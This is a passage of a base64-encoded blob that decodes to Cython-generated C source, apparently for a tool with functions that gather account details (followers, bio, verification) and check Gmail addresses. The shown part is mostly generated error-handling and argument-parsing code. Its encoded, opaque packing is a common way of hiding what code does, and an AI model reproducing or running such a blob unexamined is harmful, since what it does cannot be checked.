hX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAyNzUsIF9fcHl4X0wzN19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMik7IF9fcHl4X3RfMjIgPSAwO1xuICAgICAgICBnb3RvIF9fcHl4X0w0Ml90cnlfZW5kO1xuICAgICAgICBfX3B5eF9MMzdfZXJyb3I6O1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF8yNCA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTtcbiAgICAgICAgaWYgKF9fcHl4X3RfMjQpIHtcbiAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzE3LCAmX19weXhfdF8xNiwgJl9fcHl4X3RfMTUpIDwgMCkgX19QWVhfRVJSKDAsIDI3NywgX19weXhfTDM5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTcpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgX19weXhfdl9lID0gX19weXhfdF8xNjtcbiAgICAgICAgICAge1xuXG4gICAgICAgICAgICBcbiAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBOVUxMO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpO1xuICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IFxuICAgICAgICAgICAgX19weXhfdF81ID0gMTtcbiAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vd307XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzE0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE5KSkgX19QWVhfRVJSKDAsIDI3OCwgX19weXhfTDQ4X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgICAgICAgIH1cblxuICAgICAgICAgIFxuICAgICAgICAgICB7XG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwO1xuICAgICAgICAgICAgICBnb3RvIF9fcHl4X0w0OTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fcHl4X0w0OF9lcnJvcjo7XG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICAgICAgICBfX3B5eF90XzI3ID0gMDsgX19weXhfdF8yOCA9IDA7IF9fcHl4X3RfMjkgPSAwOyBfX3B5eF90XzMwID0gMDsgX19weXhfdF8zMSA9IDA7IF9fcHl4X3RfMzIgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblN3YXAoJl9fcHl4X3RfMzAsICZfX3B5eF90XzMxLCAmX19weXhfdF8zMik7XG4gICAgICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzI3LCAmX19weXhfdF8yOCwgJl9fcHl4X3RfMjkpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzI3LCAmX19weXhfdF8yOCwgJl9fcHl4X3RfMjkpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjcpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjgpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjkpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzApO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzEpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzIpO1xuICAgICAgICAgICAgICBfX3B5eF90XzI0ID0gX19weXhfbGluZW5vOyBfX3B5eF90XzI1ID0gX19weXhfY2xpbmVubzsgX19weXhfdF8yNiA9IF9fcHl4X2ZpbGVuYW1lO1xuICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zMCk7XG4gICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMzEpO1xuICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMyKTtcbiAgICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8zMCwgX19weXhfdF8zMSwgX19weXhfdF8zMik7XG4gICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjcpO1xuICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI4KTtcbiAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yOSk7XG4gICAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8yNywgX19weXhfdF8yOCwgX19weXhfdF8yOSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMjcgPSAwOyBfX3B5eF90XzI4ID0gMDsgX19weXhfdF8yOSA9IDA7IF9fcHl4X3RfMzAgPSAwOyBfX3B5eF90XzMxID0gMDsgX19weXhfdF8zMiA9IDA7XG4gICAgICAgICAgICAgIF9fcHl4X2xpbmVubyA9IF9fcHl4X3RfMjQ7IF9fcHl4X2NsaW5lbm8gPSBfX3B5eF90XzI1OyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X3RfMjY7XG4gICAgICAgICAgICAgIGdvdG8gX19weXhfTDM5X2V4Y2VwdF9lcnJvcjtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fcHl4X0w0OTo7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDM4X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gX19weXhfTDM5X2V4Y2VwdF9lcnJvcjtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfTDM5X2V4Y2VwdF9lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjEpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIyKTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzIxLCBfX3B5eF90XzIyKTtcbiAgICAgICAgZ290byBfX3B5eF9MMzFfZXJyb3I7XG4gICAgICAgIF9fcHl4X0wzOF9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjEpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIyKTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzIxLCBfX3B5eF90XzIyKTtcbiAgICAgICAgX19weXhfTDQyX3RyeV9lbmQ6O1xuICAgICAgfVxuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICBnb3RvIF9fcHl4X0wzNl90cnlfZW5kO1xuICAgIF9fcHl4X0wzMV9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygib3AuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xNSwgJl9fcHl4X3RfMTYsICZfX3B5eF90XzE3KSA8IDApIF9fUFlYX0VSUigwLCAyNzksIF9fcHl4X0wzM19leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xNCA9IE5VTEw7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7XG4gICAgICBfX3B5eF90XzEzID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gICAgICBfX3B5eF90XzUgPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X293fTtcbiAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgMjgwLCBfX3B5eF9MMzNfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgZ290byBfX3B5eF9MMzJfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDMzX2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIwKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzYpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF8yMCwgX19weXhfdF82KTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wzMl9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIwKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzYpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF8yMCwgX19weXhfdF82KTtcbiAgICBfX3B5eF9MMzZfdHJ5X2VuZDo7XG4gIH1cblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygib3AuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcnIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfSWQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZnVsbF9uYW1lKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Zvd3MpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZm93Zyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9wcCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9pc1ByYWlzZSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9iaW8pO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaXNfdmVyaWZpZWQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYml6eik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9zcyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9maWxlKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJvcF8xMUdtYWlsKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJvcF8xMUdtYWlsID0geyJHbWFpbCIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMm9wXzExR21haWwsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJvcF8xMUdtYWlsKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZW1haWwgPSAwO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJncztcbiAgI2VuZGlmXG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJHbWFpbCAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW1haWwsMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAyODMsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyODMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJHbWFpbCIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjgzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJHbWFpbCIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgMjgzLCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDI4MywgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3ZfZW1haWwgPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJHbWFpbCIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDI4MywgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcC5HbWFpbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJvcF8xMEdtYWlsKF9fcHl4X3NlbGYsIF9fcHl4X3ZfZW1haWwpO1xuXG4gIFxuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pK